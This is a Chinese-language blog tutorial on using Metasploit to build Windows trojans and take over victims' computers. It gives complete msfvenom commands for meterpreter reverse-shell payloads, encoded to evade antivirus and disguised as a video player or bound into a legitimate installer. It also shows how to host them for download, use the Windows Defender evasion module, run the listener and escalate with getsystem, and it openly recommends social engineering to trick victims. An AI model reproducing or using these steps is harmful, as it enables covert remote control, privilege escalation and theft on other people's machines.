---
title: "制作Windows恶意软件监听个人电脑"
date: 2020-02-22T17:25:22+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

Metasploit木马命令制作windows恶意软件提权监听个人电脑



<!--more-->



## 客户端渗透原理 

> 在无法突破对方的网络边界的时候，往往需要使用客户端渗透这种方式对目标发起攻击，比如 我们想目标发一个含有后门的程序，或者是一个word文档、pdf文件，利用好社会工程学，来诱骗受害者执行恶意程序。通常用户的计算机都安装了安全软件，一般我们生成的恶意程序都会被检测.设计的恶意软件可以利用人的劣根性，但是也需要利用免杀来躲避 安全软件的查杀



## 制作Windows恶意软件获取shell

> msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机 上执行,在本地监听上线

## 原理

![](http://junmoxiao.org.cn/20200222173629.png)

## 实现步骤

* 生成西瓜影音.exe后门程序 

  ~~~
  msfvenom -h #帮助文档
  ~~~

  ~~~
  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai  -i 10 -f exe -o /var/www/html/西瓜影音.exe 
  ~~~

> 参数说明
>
> -a 指定架构如x86x64  x86代表32位， x64代表64位。 32位软件可以在64位系统上运行。 所以我们生成32位的后门，这样在32位和64位系统中都可以使用。 
>
> --platform 指定平台 通过 --l platforms可以查看所有支持的平台 
>
> -p 设置攻击载荷 通过-l payloads查看所 有攻击载荷
>
> LHOST 目标主机执行程序后连接我们Kali的地址
>
> LPORT 目标主机执行程序后连接我们Kali的端口 
>
> -b 去掉坏字符，坏字符会影响payload正常执行  \x00 ->null 
>
> -e 指定编码器，也就是所谓的免杀 可以通过 -l encoders查看所有编码器
>
> -i 指定payload有效载荷编码迭代次数。 指定编码加密次数，为了让杀毒软件，更难查出源代码 
>
> -f 指定生成格式  用 -l formats 查看所有支持的格式
>
> -o 指定文件名称和导出位置  指定到网站根目录/var/www/html，方便在肉机上下载后门程序

* 开启WEB服务
* 在MSF上启动handler开始监听后门程序

~~~
use exploit/multi/handler
set payload  windows/meterpreter/reverse_tcp
help
backgroud
sessions
~~~

![](http://junmoxiao.org.cn/20200222183539.png)



## 给真正的软件加上后门

* 先下载一个正常的软件

* 把payload后门和这些小程序绑定到一起

  ~~~
  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 -f exe -x QvodTerminal.exe -o /var/www/html/QvodTerminal.exe
  ~~~

* 开启WEB服务

* 在MSF上启动handler开始监听后门程序

~~~
use exploit/multi/handler
set payload  windows/meterpreter/reverse_tcp
run
help
backgroud
sessions
~~~

## Metasploit evasion模块生成后门木马 

> evasion 是 metasploit 自带的模块，使用此模块可以生成反杀毒软件的木马

![](http://junmoxiao.org.cn/20200222192233.png)

* 生成后门程序 

~~~
banner
search evasion
use evasion/windows/windows_defender_exe
set payload  windows/meterpreter/reverse_tcp
run
~~~

* 打开另一个终端，将生成的木马文件复制到 /var/www/html ，开启WEB服务
* 启动handler开启监听后门木马

~~~
use exploit/multi/handler
set payload  windows/meterpreter/reverse_tcp
run
help
getsystem
backgroud
sessions
~~~

